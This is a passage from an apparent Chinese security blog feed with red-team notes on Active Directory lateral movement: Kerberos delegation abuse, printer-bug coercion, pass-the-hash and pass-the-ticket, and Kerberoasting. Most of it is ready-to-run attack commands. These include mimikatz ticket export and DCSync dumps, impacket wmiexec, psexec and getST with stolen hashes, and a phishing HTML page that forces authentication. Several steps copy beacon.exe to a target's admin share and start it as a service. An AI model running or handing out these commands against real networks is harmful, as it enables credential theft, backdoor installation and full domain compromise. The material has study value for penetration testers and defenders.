NetBIOS 请求并进行响应）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -<span class="selector-tag">I</span> eth0</span><br></pre></td></tr></table></figure><p>在 DC（192.168.141.130）上随便传递一个 SMB 流量</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">net</span> <span class="keyword">use</span> \\whoami</span><br></pre></td></tr></table></figure><p>拿到了目标机器的 shell</p>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>横向移动-3</title>
      <link href="/2025/06/19/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-3/"/>
      <url>/2025/06/19/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-3/</url>
      
        <content type="html"><![CDATA[<h1 id="横向移动-3（kerberos）"><a href="#横向移动-3（kerberos）" class="headerlink" title="横向移动-3（kerberos）"></a>横向移动-3（kerberos）</h1><h2 id="委派安全"><a href="#委派安全" class="headerlink" title="委派安全"></a>委派安全</h2><p><a href="https://forum.butian.net/share/1591">https://forum.butian.net/share/1591</a><br>什么是委派？<br>委派是一种域内应用模式，是指将域内用户账户的权限委派给服务账号，服务账号因此能以用户的身份再域内展开活动（请求新的服务等），类似于租房中介房东的关系。</p><p>域委派分类：<br>1，非约束委派(UnconstrainedDelegation,UD)<br>2，约束委派(Constrained Delegation,CD)<br>3，基于资源的约束委派(ResourceBasedConstrainedDelegation,RBCD)<br>简而言之，非约束委派是指用户账户将自身的TGT转发给服务账户使用。约束委派通过<br>S4U2Se1f和S4U2PrOxy两个扩展协议限制服务账户只能访问指定服务资源。<br>RBCD主要就是委派的管理移交给服务资源进行控制，其余和约束性委派基本相同。</p><p>利用场景：<br>攻击者拿到了一台配置非约束委派的机器权限，可以诱导DC来访问该机器，然后得到管理员的TGT，从而模拟域管理用户。</p><h2 id="一，非约束委派"><a href="#一，非约束委派" class="headerlink" title="一，非约束委派"></a>一，非约束委派</h2><p>⽤户 A 去访问服务B，服务 B 的服务账户开启了⾮约束委派，那么当⽤户 A 访问服务 B 的时候会将⽤户 A 的 TGT发送给服务 B 并保存进内存，服务 B 能够利⽤⽤户 A 的身份去访问⽤户 A 能够访问的任意服务。</p><p><strong>利用思路:</strong></p><ul><li>先通过ldapsearch或者adfind或者powerview查询域内配置了非约束性委派的机器。</li><li>那下目标机器权限。</li><li>诱导域管对我们这台机器进行委派(通过使用钓鱼或者打印机哪个漏洞)。</li><li>拿到域管的TGT</li><li>将域管的TGT注入</li></ul><p>查找域内⾮约束委派⽤户和计算机</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">列出域控制器名称：</span><br><span class="line">AdFind -<span class="keyword">sc </span>dclist</span><br><span class="line">查询当前域中在线的计算机：</span><br><span class="line">AdFind -<span class="keyword">sc </span>computers_active</span><br><span class="line">查询当前域中在线的计算机(只显示名称和操作系统)：</span><br><span class="line">AdFind -<span class="keyword">sc </span>computers_active name operatingSystem</span><br><span class="line">查询当前域中所有计算机：</span><br><span class="line">AdFind -f <span class="string">&quot;objectcategory=computer&quot;</span></span><br><span class="line">查询当前域中所有计算机(只显示名称和操作系统)：</span><br><span class="line">AdFind -f <span class="string">&quot;objectcategory=computer&quot;</span> name operatingSystem</span><br><span class="line">查询域内所有用户：</span><br><span class="line">AdFind -users name</span><br><span class="line">查询所有GPO：</span><br><span class="line">AdFind -<span class="keyword">sc </span>gpodmp</span><br></pre></td></tr></table></figure><p>查询域内设置了非约束委派的服务账户：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=xiaodi,DC=local&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure><p>查询域内设置了非约束委派的机器账户：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=xiaodi,DC=local&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure><p>1,诱使管理员访问机器<br>利用条件：</p><ul><li>需要administrator权限</li><li>域内主机的机器账户开启非约束委派</li><li>域控管理员远程访问（被动或主动）</li></ul><p><strong>利用思路1：</strong><br>1，域控域委派机器通讯（偏理想化，不实用）<br>主动：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">net</span> <span class="keyword">use</span> \\webserver</span><br></pre></td></tr></table></figure><p>钓鱼：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.32/31.html</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;file:///\\\192.168.3.32\2&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2，导出票据到本地</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::tickets /<span class="keyword">export</span></span><br></pre></td></tr></table></figure><p>3，导入票据到内存</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptt [0;22d3a]<span class="string">-2</span><span class="string">-1</span><span class="string">-40</span>e00000-Administrator@krbtgt-god.org.kirbi</span><br></pre></td></tr></table></figure><p>4,连接通讯域控</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shell</span><span class="language-bash"> <span class="built_in">dir</span> \\<span class="built_in">test</span>\c$</span></span><br></pre></td></tr></table></figure><p><strong>利用思路2：</strong><br>利用条件：DC 2012以上</p><ul><li>Administrator权限监听</li><li>打印机服务spooler开启（默认开启）</li></ul><p>利用过程：<br>1，监听来自DC的请求数据并保存文件</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell Rubeus.exe<span class="built_in"> monitor </span>/interval:2 /filteruser:dc$ &gt;hash.txt</span><br></pre></td></tr></table></figure><p>域用户运行SpoolSample强制让DC请求</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shell</span> SpoolSample.<span class="keyword">exe</span> dc web2016</span><br></pre></td></tr></table></figure><p>2，Rubeus监听到票据并导入该票据</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shell</span> Rubeus.<span class="keyword">exe</span> ptt /ticke<span class="variable">t:xxx</span></span><br></pre></td></tr></table></figure><p>3，使用mimikatz导出域内hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz lsadump::dcsync /domain:test8.com /all /csv</span><br></pre></td></tr></table></figure><p>4，使用wmi借助hash横向移动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py -hashes :518b32ca32c32144ck421aa31c321c test8.com/administrator@dc.test8.com -no-pass</span><br></pre></td></tr></table></figure><h2 id="二，资源约束委派-利用域用户主机加入（SID一致时）"><a href="#二，资源约束委派-利用域用户主机加入（SID一致时）" class="headerlink" title="二，资源约束委派-利用域用户主机加入（SID一致时）"></a>二，资源约束委派-利用域用户主机加入（SID一致时）</h2><h3 id="1，获取受害目标（需要先上传AdFind）"><a href="#1，获取受害目标（需要先上传AdFind）" class="headerlink" title="1，获取受害目标（需要先上传AdFind）"></a>1，获取受害目标（需要先上传AdFind）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -h 192.168.3.33 -b &quot;DC=xiaodi,DC=local&quot; -f &quot;objectClass=computer&quot; mS-DS-CreatorSID</span><br></pre></td></tr></table></figure><p>如果两台主机SID相同，则存在资源约束委派的可能性，SID不同就不存在利用的可能性<br><img src="/img/image3.png" alt="alt text"><br>根据查询出来的 sid 找出对应的用户名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell AdFind.exe -b &quot;DC=xiaodi,DC=local&quot; -f &quot;(&amp;(objectsid=S-1-5-21-1695257952-3088263962-2055235443-1104))&quot; objectclass cn dn</span><br></pre></td></tr></table></figure><p><img src="/img/image4.png" alt="alt text"><br>这里找出来对应的用户名是dbadmin，如果我们有这个用户的权限那么就可以进行攻击</p><h3 id="2、利用新增机器账户"><a href="#2、利用新增机器账户" class="headerlink" title="2、利用新增机器账户"></a>2、利用新增机器账户</h3><p>添加一个机器账户，用于申请票据（以下有三种方式）</p><ul><li>使用 addcpmputer 创建机器账户</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python addcomputer.py xiaodi8.com/web2016:Xiaodi12345 -method LDAPS -computer-name test01\$ -computer-pass Passw0rd -dc-ip 192.168.139.11</span><br></pre></td></tr></table></figure><ul><li>使用 bloodyAD 工具创建机器账户</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python bloodyAD.py -d redteam.lab -u web2016 -p &#x27;Xiaodi12345&#x27; --host 192.168.139.11 addComputer test01 &#x27;Passw0rd&#x27;</span><br></pre></td></tr></table></figure><ul><li>使用 PowerMad 工具创建机器账户（推荐）但需要上传文件<br><a href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">Set-ExecutionPolicy</span> Bypass <span class="literal">-Scope</span> <span class="keyword">Process</span></span><br><span class="line">powershell <span class="built_in">Import-Module</span> .\Powermad.ps1;<span class="built_in">New-MachineAccount</span> <span class="literal">-MachineAccount</span> serviceA <span class="literal">-Password</span> <span class="variable">$</span>(<span class="built_in">ConvertTo-SecureString</span> <span class="string">&quot;123456&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>)</span><br></pre></td></tr></table></figure><p>执行后就会发现多了一个serviceA用户<br><img src="/img/image5.png" alt="alt text"></p><h3 id="3、获取sid"><a href="#3、获取sid" class="headerlink" title="3、获取sid"></a>3、获取sid</h3><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">Get-NetComputer</span> serviceA <span class="literal">-Properties</span> objectsid</span><br><span class="line">S<span class="literal">-1-5-21-1695257952-3088263962-2055235443-1104</span></span><br></pre></td></tr></table></figure><h3 id="4-设置修改委派属性"><a href="#4-设置修改委派属性" class="headerlink" title="4,设置修改委派属性"></a>4,设置修改委派属性</h3><p>即msDS-AllowedToActOnBehalfOfOtherIdentity属性</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">powershell</span><br><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Bypass <span class="literal">-Scope</span> <span class="keyword">Process</span></span><br><span class="line"><span class="built_in">import-module</span> .\powerview.ps1</span><br><span class="line"><span class="variable">$SD</span> = <span class="built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor <span class="literal">-ArgumentList</span> <span class="string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1695257952-3088263962-2055235443-1104)&quot;</span><span class="comment">#将SID修改为上方获取的SID值</span></span><br><span class="line"><span class="variable">$SDBytes</span> = <span class="built_in">New-Object</span> byte[] (<span class="variable">$SD</span>.BinaryLength)</span><br><span class="line"><span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, <span class="number">0</span>)</span><br><span class="line"><span class="built_in">Get-DomainComputer</span> <span class="keyword">DATA</span>| <span class="built_in">Set-DomainObject</span> <span class="literal">-Set</span> <span class="selector-tag">@</span>&#123;<span class="string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="variable">$SDBytes</span>&#125; <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure><h3 id="5-验证修改是否成功"><a href="#5-验证修改是否成功" class="headerlink" title="5,验证修改是否成功"></a>5,验证修改是否成功</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomainComputer</span> <span class="keyword">DATA</span> <span class="literal">-Properties</span> msds<span class="literal">-allowedtoactonbehalfofotheridentity</span></span><br></pre></td></tr></table></figure><h3 id="6-清除修改设置"><a href="#6-清除修改设置" class="headerlink" title="6,清除修改设置"></a>6,清除修改设置</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-DomainObject</span> <span class="keyword">DATA</span> <span class="literal">-Clear</span> <span class="string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure><h3 id="7-利用修改后的属性申请目标请求票据后导入利用"><a href="#7-利用修改后的属性申请目标请求票据后导入利用" class="headerlink" title="7,利用修改后的属性申请目标请求票据后导入利用"></a>7,利用修改后的属性申请目标请求票据后导入利用</h3><p>利用 serviceA 申请访问 data 主机 cifs 服务票据：<br>目标主机上一般没有python环境，代理转发到本地使用py脚本<br>getST.py</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python getST.py -dc-ip 192.168.3.33 xiaodi.local/serviceA\$:123456 -spn cifs/data.xiaodi.local -impersonate administrator</span><br></pre></td></tr></table></figure><p>执行完后就会产生一个ccache文件</p><p>将他传到机器上</p><p>导入票据到内存：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptc administrator.ccache</span><br></pre></td></tr></table></figure><p>连接利用票据：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shell</span> <span class="keyword">dir</span> \\data.xiaodi.<span class="keyword">local</span>\c$</span><br></pre></td></tr></table></figure><p>kali上：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用getST.py申请票据</span></span><br><span class="line">python3 getST.py xiaodi.local/serviceA\$:123456 -spn cifs/data.xiaodi.local -impersonate administrator -dc-ip 192.168.3.33</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导入票据</span></span><br><span class="line">export KRB5CCNAME=/root/Desktop/administrator.ccache</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">直接登录</span></span><br><span class="line">python3 wmiexec.py -k xiaodi.local/administrator@data.redteam.lab -no-pass</span><br><span class="line">python3 psexec.py -k redteam.lab/administrator@data.redteam.lab -no-pass</span><br></pre></td></tr></table></figure><h2 id="三，资源约束委派-Acount-Operators-组（SID不一致时）"><a href="#三，资源约束委派-Acount-Operators-组（SID不一致时）" class="headerlink" title="三，资源约束委派-Acount Operators 组（SID不一致时）"></a>三，资源约束委派-Acount Operators 组（SID不一致时）</h2><p>利用思路：<br>Acount Operators 组成员可修改域内任意主机的<br>msDS-AllowedToActOnBehalfOfOtherIdentity 属性。（除 DC）</p><p>利用条件：<br>1、获取到属于 Acount Operators 组的用户账户<br>2、可以创建机器账户</p><h3 id="1、判断是否有利用条件："><a href="#1、判断是否有利用条件：" class="headerlink" title="1、判断是否有利用条件："></a>1、判断是否有利用条件：</h3><p>查询 Acount Operators 组成员：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shell </span>adfind.exe -h <span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">33</span>:<span class="number">389</span> -s <span class="keyword">subtree </span>-<span class="keyword">b </span>CN=<span class="string">&quot;Account Operators&quot;</span>,CN=<span class="keyword">Builtin,DC=xiaodi,DC=local </span>member</span><br></pre></td></tr></table></figure><p><img src="/img/image6.png" alt="alt text"></p><h3 id="2、后续利用同上"><a href="#2、后续利用同上" class="headerlink" title="2、后续利用同上"></a>2、后续利用同上</h3><ul><li>新增机器账户</li><li>利用新增机器账户修改委派属性满足申请访问目标票款</li><li>利用修改后的属性申请目标请求票据后导入利用</li></ul><h2 id="四，结合HTLM-Relay攻击拿下主机"><a href="#四，结合HTLM-Relay攻击拿下主机" class="headerlink" title="四，结合HTLM Relay攻击拿下主机"></a>四，结合HTLM Relay攻击拿下主机</h2><p>绕过NTLM MIC校验+打印机漏洞+NTLM Relay+基于资源的约束性委派组合攻击<br>利用条件：</p><ul><li>能创建机器账户</li><li>目标开启打印机服务</li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>横向移动-2</title>
      <link href="/2025/06/19/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-2/"/>
      <url>/2025/06/19/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-2/</url>
      
        <content type="html"><![CDATA[<h1 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h1><p>pass the hash（哈希传递攻击）<br>pass the ticket （票据传递攻击）<br>pass the key （密钥传递攻击）<br>PTH（pass the hash） # 利用的lm或ntlm的值进行的渗透测试（NTLM认证攻击）<br>PTK（pass the key ） #利用的ekeys aes256进行的渗透测试（NTLM认证攻击）<br>PTT（pass the ticket） #利用的票据凭证TGT进行渗透测试（Kerberos认证攻击）</p><p>逻辑思路：<br>明文传递-&gt;PTH(HASH传递)-&gt;PTT(票据攻击)-&gt;PTK(AES)</p><p>利用思路：</p><h2 id="一，利用直接的Hash传递"><a href="#一，利用直接的Hash传递" class="headerlink" title="一，利用直接的Hash传递"></a>一，利用直接的Hash传递</h2><h3 id="1，Mimikatz"><a href="#1，Mimikatz" class="headerlink" title="1，Mimikatz"></a>1，Mimikatz</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mimikatz privilege::debug</span><br><span class="line">mimikatz sekurlsa::pth /user:administrator /domain:<span class="number">192.168</span>.<span class="number">3.32</span> /ntlm:<span class="number">518</span>b32ca32c32144ck421aa31c321c</span><br><span class="line"><span class="comment"># 与域控建立IPC</span></span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">3.32</span>\c<span class="variable">$</span></span><br><span class="line"><span class="comment">#将后门文件beacon.exe放到目标c盘中</span></span><br><span class="line"><span class="built_in">copy</span> beacon.exe \\<span class="number">192.168</span>.<span class="number">3.32</span>\c<span class="variable">$</span></span><br><span class="line"><span class="comment">#设置定时任务</span></span><br><span class="line"><span class="built_in">sc</span> \\test create bshell binpath=<span class="string">&quot;c:\4.exe&quot;</span></span><br><span class="line"><span class="built_in">sc</span> \\test <span class="built_in">start</span> bshell</span><br></pre></td></tr></table></figure><h3 id="2，impacket-at-ps-wemi-smb"><a href="#2，impacket-at-ps-wemi-smb" class="headerlink" title="2，impacket-at&amp;ps&amp;wemi&amp;smb"></a>2，impacket-at&amp;ps&amp;wemi&amp;smb</h3><p>psexec -hashes :NTLM值 域名&#x2F;域用户@域内ip地址<br>smbexec -hashes :NTLM值 域名&#x2F;域用户@域内ip地址<br>wmiexec -hashes :NTLM值 域名&#x2F;域用户@域内ip地址</p><h2 id="二，利用hash转成PTT传递"><a href="#二，利用hash转成PTT传递" class="headerlink" title="二，利用hash转成PTT传递"></a>二，利用hash转成PTT传递</h2><p>看下面PPT讲解</p><h2 id="三，利用hash进行暴力破解明文"><a href="#三，利用hash进行暴力破解明文" class="headerlink" title="三，利用hash进行暴力破解明文"></a>三，利用hash进行暴力破解明文</h2><p><a href="https://cmd5.com/">https://cmd5.com/</a><br><a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hashcat -<span class="selector-tag">a</span> <span class="number">0</span> -m <span class="number">1000</span> <span class="attr">--force</span> <span class="number">518</span>b32ca32c32144ck421aa31c321c pass<span class="selector-class">.txt</span></span><br><span class="line"></span><br><span class="line">-m 密文类型</span><br><span class="line">-<span class="selector-tag">a</span> 破解类型</span><br><span class="line">?l 小写</span><br><span class="line">?s 符号</span><br><span class="line">?d 数字</span><br></pre></td></tr></table></figure><p>字典破解</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hashcat</span> -a <span class="number">0</span> -m <span class="number">1000</span> hash.txt pass.txt</span><br></pre></td></tr></table></figure><p>暴力破解</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hashcat</span> -a <span class="number">3</span> -m <span class="number">1000</span> <span class="number">518</span>b32ca32c32144ck421aa31c321c ?l?l?l?l?l?s?s?s?d?d</span><br></pre></td></tr></table></figure><h1 id="PTH-1"><a href="#PTH-1" class="headerlink" title="PTH"></a>PTH</h1><p>pass the ticket （票据传递攻击）</p><h2 id="1-kekeo-高权限，需NTLM"><a href="#1-kekeo-高权限，需NTLM" class="headerlink" title="1.kekeo(高权限，需NTLM)"></a>1.kekeo(高权限，需NTLM)</h2><ul><li>利用获取的NTML生成新的票据尝试认证</li></ul><p>因为当前主机肯定之前域其他主机连接过，所以本地应该会生成一些票据，我们导出这些票据，然后再导入票据，利用。该方法类似于cookie欺骗<br>缺点：票据是有有效期的，所以如果当前在连接过域控的话，有效期内可利用<br>生成票据：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shell</span><span class="language-bash"> kekeo <span class="string">&quot;tgt:ask /user:Administrator /domain:god.org /ntlm:518b32ca32c32144ck421aa31c321c&quot;</span> <span class="string">&quot;eixt&quot;</span></span></span><br></pre></td></tr></table></figure><p>导入票据：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">shell</span> kekeo <span class="string">&quot;kerberos::ptt TGT_Administrator<span class="variable">@GOD</span>.ORG_krbtgt~god.org<span class="variable">@GOD</span>. ORG.kirbi&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure><p>查看票据：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shell</span><span class="language-bash"> klist</span></span><br></pre></td></tr></table></figure><p>利用票据连接：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">dir</span> \\主机名\C<span class="variable">$</span></span><br><span class="line">shell net use \\主机名\C<span class="variable">$</span></span><br><span class="line"><span class="built_in">copy</span> beacon.exe \\主机名\C<span class="variable">$</span></span><br><span class="line"><span class="built_in">sc</span> \\主机名 create bindshell binpath=<span class="string">&quot;c:\beacon.exe&quot;</span></span><br><span class="line"><span class="built_in">sc</span> \\主机名 <span class="built_in">start</span> bindshell</span><br></pre></td></tr></table></figure><h2 id="2-mimikatz-高权限，需Ticket"><a href="#2-mimikatz-高权限，需Ticket" class="headerlink" title="2.mimikatz(高权限，需Ticket)"></a>2.mimikatz(高权限，需Ticket)</h2><ul><li>利用历史遗留的票据重新认证尝试</li></ul><p>导出票据：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::tickets /<span class="keyword">export</span></span><br></pre></td></tr></table></figure><p>导入票据：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptt [0;22d3a]<span class="string">-2</span><span class="string">-1</span><span class="string">-40</span>e00000-Administrator@krbtgt-god.org.kirbi</span><br></pre></td></tr></table></figure><p>查看票据：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shell</span><span class="language-bash"> klist</span></span><br></pre></td></tr></table></figure><p>利用票据连接：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shell</span><span class="language-bash"> <span class="built_in">dir</span> \\主机名\c$</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong>：是否成功看当前主机有没有被目标连接过</p><h2 id="3-Kerberoasting"><a href="#3-Kerberoasting" class="headerlink" title="3.Kerberoasting"></a>3.Kerberoasting</h2><ul><li>利用通讯的加密类型票据进行爆破明文</li></ul><p>Kerberos攻击条件：<br>采用rc4加密类型票据，攻击Rubeus&amp;Impacket检测或看票据加密类型<br>Kerberoasting攻击利用：<br><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting">https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting</a></p><ul><li>SPN服务发现</li><li>请求服务票据</li><li>服务票据的导出</li><li>服务票据的暴力破解<br><a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a><br><a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></li></ul><p>黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个<br>目标服务的服务票证。DC在活动目录中查找SPN，并用与SPN关联的服务帐户加密票<br>证，以便服务能验证用户是否可以访问。请求的Kerberos服务票证的密类型是<br>RC4_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。黑客将收到的<br>TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerberoast攻<br>击。如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM<br>哈希值就将用于创建服务票证。</p><p><strong>注意</strong>：是否成功看当前主机票据加密类型<br>SPN:</p><p>SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN<br>SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下<br>当一个服务的权限为<strong>Local System</strong>或<strong>Network Service</strong>，则SPN注册在机器帐户(Computers)下<br>当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</p><p>SPN的格式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 